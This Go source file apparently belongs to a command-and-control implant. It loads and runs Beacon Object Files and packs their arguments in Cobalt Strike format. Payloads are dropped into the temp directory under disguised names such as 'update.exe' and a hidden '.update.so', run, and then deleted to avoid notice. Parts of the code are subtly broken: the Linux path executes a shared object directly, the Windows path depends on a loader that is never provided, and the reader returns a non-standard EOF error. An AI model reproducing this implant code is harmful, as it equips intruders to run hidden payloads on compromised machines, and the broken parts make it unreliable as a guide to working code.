package implant

import (
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

// BOFLoader handles Beacon Object File execution.
// BOFs are compiled COFF object files that run in-process.
// For cross-platform support, we use a shim approach:
// - Windows: Load COFF via custom loader (inline execution)
// - Linux: Compile to shared object and dlopen

// ExecuteBOF executes a Beacon Object File.
// bofData contains the raw .o (COFF) bytes.
// args contains the packed arguments for the BOF entry point.
func ExecuteBOF(bofData []byte, args []byte) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return executeBOFWindows(bofData, args)
	}
	return executeBOFLinux(bofData, args)
}

// executeBOFWindows runs a COFF object file on Windows.
// Uses a temp file + rundll32 shim approach for compatibility.
func executeBOFWindows(bofData []byte, args []byte) ([]byte, error) {
	tmpDir := os.TempDir()
	bofPath := filepath.Join(tmpDir, "update.o")
	loaderPath := filepath.Join(tmpDir, "update.exe")

	// Write BOF to disk
	if err := os.WriteFile(bofPath, bofData, 0600); err != nil {
		return nil, fmt.Errorf("write BOF: %w", err)
	}
	defer os.Remove(bofPath)

	// Write minimal loader if not present
	if _, err := os.Stat(loaderPath); os.IsNotExist(err) {
		// The loader would be embedded at compile time in a production build
		return nil, fmt.Errorf("BOF loader not available — use inline-execute module")
	}
	defer os.Remove(loaderPath)

	// Execute
	cmd := exec.Command(loaderPath, bofPath)
	if len(args) > 0 {
		cmd.Stdin = bytesReader(args)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return output, fmt.Errorf("BOF execution failed: %w", err)
	}

	return output, nil
}

// executeBOFLinux handles BOF-like execution on Linux via shared objects.
func executeBOFLinux(bofData []byte, args []byte) ([]byte, error) {
	tmpDir := os.TempDir()
	soPath := filepath.Join(tmpDir, ".update.so")

	// Write shared object
	if err := os.WriteFile(soPath, bofData, 0700); err != nil {
		return nil, fmt.Errorf("write SO: %w", err)
	}
	defer os.Remove(soPath)

	// Execute via LD_PRELOAD trick or direct execution
	cmd := exec.Command(soPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return output, fmt.Errorf("SO execution failed: %w", err)
	}

	return output, nil
}

// PackBOFArgs packs arguments in Cobalt Strike BOF argument format.
// Format: [type:4][length:4][data:N] for each argument.
// Types: 1=short, 2=int, 3=string, 4=wstring, 5=binary
func PackBOFArgs(args ...BOFArg) []byte {
	var buf []byte

	for _, arg := range args {
		// Type
		typeBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(typeBuf, uint32(arg.Type))
		buf = append(buf, typeBuf...)

		// Length
		lenBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(lenBuf, uint32(len(arg.Data)))
		buf = append(buf, lenBuf...)

		// Data
		buf = append(buf, arg.Data...)
	}

	return buf
}

// BOFArg represents a single BOF argument.
type BOFArg struct {
	Type uint32
	Data []byte
}

// BOF argument types (Cobalt Strike compatible).
const (
	BOFArgShort   uint32 = 1
	BOFArgInt     uint32 = 2
	BOFArgString  uint32 = 3
	BOFArgWString uint32 = 4
	BOFArgBinary  uint32 = 5
)

// NewBOFStringArg creates a string BOF argument.
func NewBOFStringArg(s string) BOFArg {
	return BOFArg{Type: BOFArgString, Data: append([]byte(s), 0)} // null-terminated
}

// NewBOFIntArg creates an integer BOF argument.
func NewBOFIntArg(i int) BOFArg {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(i))
	return BOFArg{Type: BOFArgInt, Data: buf}
}

// bytesReader wraps a byte slice for use as io.Reader.
type bytesReaderType struct {
	data []byte
	pos  int
}

func bytesReader(data []byte) *bytesReaderType {
	return &bytesReaderType{data: data}
}

func (r *bytesReaderType) Read(p []byte) (n int, err error) {
	if r.pos >= len(r.data) {
		return 0, fmt.Errorf("EOF")
	}
	n = copy(p, r.data[r.pos:])
	r.pos += n
	return
}
